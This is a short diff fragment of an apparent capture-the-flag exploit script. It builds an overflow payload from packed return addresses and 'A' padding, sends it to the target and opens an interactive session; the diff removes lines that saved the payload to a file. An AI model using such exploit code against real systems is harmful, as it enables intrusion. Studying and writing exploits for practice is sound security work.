@@ -82,10 +82,5 @@ payload += p64(0x00000000004000ed)
 payload += p64(0x400101)
 payload += "A"*(0x142-len(payload)-1)
 
-asdf = open("exp", "w")
-asdf.write(payload + "\n")
-
-asdf.close()
-
 r.sendline(payload)
 r.interactive()```
